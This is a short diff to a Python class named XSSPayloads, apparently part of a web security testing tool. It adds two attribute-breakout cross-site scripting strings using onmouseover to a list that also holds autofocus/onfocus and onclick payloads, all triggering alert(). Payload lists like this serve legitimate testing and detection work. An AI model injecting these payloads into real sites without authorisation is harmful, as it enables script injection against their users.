@@ -58,6 +58,8 @@ class XSSPayloads:
     
     # Attribute-Based Payloads
     ATTRIBUTE_BASED = [
+        '"onmouseover="alert(1)',
+        "'onmouseover='alert(1)",
         "' autofocus onfocus=alert('XSS') '",
         '" autofocus onfocus=alert(\'XSS\') "',
         "' onclick=alert('XSS') '",
